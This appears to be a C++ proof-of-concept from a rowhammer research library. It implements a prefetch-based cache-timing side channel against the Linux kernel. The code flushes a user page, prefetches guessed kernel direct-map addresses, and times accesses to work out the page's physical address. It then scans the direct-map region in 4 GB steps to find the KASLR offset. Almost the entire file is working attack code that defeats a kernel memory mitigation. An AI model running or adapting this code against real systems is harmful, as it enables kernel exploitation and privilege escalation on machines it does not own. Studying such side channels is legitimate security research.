#include "iostream"
#include "sstream"
#include "string"
#include "cstdlib"
#include "vector"
#include "set"
#include "map"
#include "../libhammer.h"

using namespace std;

Page p;
myclock clk;
int ntime=10;
const uint64_t dm_base = 0xffff880000000000ull; // 8800 - c7ff phys direct map base vaddr. can find in kernel docs
const int threshold = 150;

void warmup()
{
    int sum=0;
    for (int i=0; i<ntime; ++i)
        for (int j=0; j<PAGE_SIZE; ++j)
            sum += p.get<uint8_t>(j);
}

void test_no_pf()
{
    warmup();
    void *v = p.v.get();
    for (int i=0; i<ntime; ++i)
    {
        CLFLUSH(v);
        MFENCE;
        START_TSC(clk);
        *(volatile int *)v;
        END_TSC(clk);
        cout << clk.ticks << " ";
    }
    cout << endl;
}

void test_pf()
{
    warmup();
    register void *v = p.v.get();
    for (int i=0; i<ntime; ++i)
    {
        CLFLUSH(v);
        MFENCE;
        PREFETCH_L3(v);
        PREFETCH_L3(v); // prefetch only once does not work. take 3 as the magic number
        PREFETCH_L3(v);
        START_TSC(clk);
        *(volatile int *)v;
        END_TSC(clk);
        cout << clk.ticks << " ";
    }
    cout << endl;
}

// use prefetch channel to decide if paddr(v) == p
int try_pa(void *va, uint64_t pa)
{
    register void *a = va;
    register uint64_t b = pa;
    int hit = 0;
//    for (int i=0; i<ntime; ++i)
//    {
//        cout << hex << (uint64_t)a << " / " << b << endl;
        CLFLUSH(a);
        MFENCE;
        PREFETCH_L3(b); PREFETCH_L3(b); PREFETCH_L3(b);
        START_TSC(clk);
        *(volatile int *)a;
        END_TSC(clk);
        return clk.ticks;
//        if (clk.ticks < threshold) ++hit;
//    }
//    return hit;
}

/*
void test_pa()
{
    warmup();
    uint64_t st = p.p & ~0xfffffull, ed = st + 0x100000ull;
    void *va = p.v.get();
    cout << "- search between " << hex << dm_base+st << " - " << dm_base+ed << endl;
    for (uint64_t pa = st; pa < ed; pa+=PAGE_SIZE)
        cout << hex << pa << " - " << dec << try_pa(va, pa) << " ns" << endl;
}
*/
void test_pa_aslr()
{
    warmup();
    void *va = p.v.get();
    uint64_t aslr_offset = 0, step = (1ull << 32), aslr_max = (1ull << 47); // try per 4GB (memory size)
    int t;

    for (; aslr_offset < aslr_max; aslr_offset+=step)
    {
        t = try_pa(va, dm_base + aslr_offset + p.p);
        cout << hex << dm_base << " + " << aslr_offset << " + " << p.p << " -> " << dec << t << " ns";
        if (t < threshold)
        {
            cout << " <- here" << endl;
            break;
        }
        cout << endl;
    }
}

int main()
{
    p.acquire();
    p.wrap();
    cout << p.inspect() << endl;
    cout << "- baseline test -" << endl;
    cout << "no prefetch: "; test_no_pf();
    cout << "prefetch:    "; test_pf();
    cout << "- address test -" << endl;
    test_pa_aslr();
    p.reset();
    return 0;
}
